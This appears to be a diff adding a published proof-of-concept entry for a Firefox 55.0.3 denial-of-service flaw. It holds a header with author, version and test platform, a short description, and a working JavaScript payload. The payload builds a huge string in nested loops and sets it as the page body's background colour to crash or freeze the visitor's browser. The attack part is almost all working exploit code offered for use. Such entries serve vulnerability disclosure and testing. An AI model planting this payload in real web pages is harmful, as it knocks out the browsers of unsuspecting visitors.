@@ -1,0 +1,27 @@
+# Exploit Title: Firefox 55.0.3 - Denial of Service (PoC)
+# Date: 2018-08-26
+# Exploit Author: L0RD
+# Vendor Homepage: mozilla.org
+# Software Link: https://www.mozilla.org/en-US/firefox/55.0.3/releasenotes/
+# Version: 55.0.3
+# Tested on: Windows 10
+# CVE: N/A
+
+# Description :
+# An issue was discovered in firefox 55.0.3 which an attacker can create a
+# webpage and put javascript payload to crash user's browser or put user in
+# non-responsive state.
+
+# Exploit :
+
+/* We don't need to create any element on webpage.we just set body
+attribute with our buffer variable*/
+<script>
+var buffer = "";
+for(var i=0;i<0x11170;i++){
+for(j=0;j<=0x9C40;j++){
+buffer += "\x44";
+}
+}
+document.body.style.backgroundColor = buffer;
+</script>
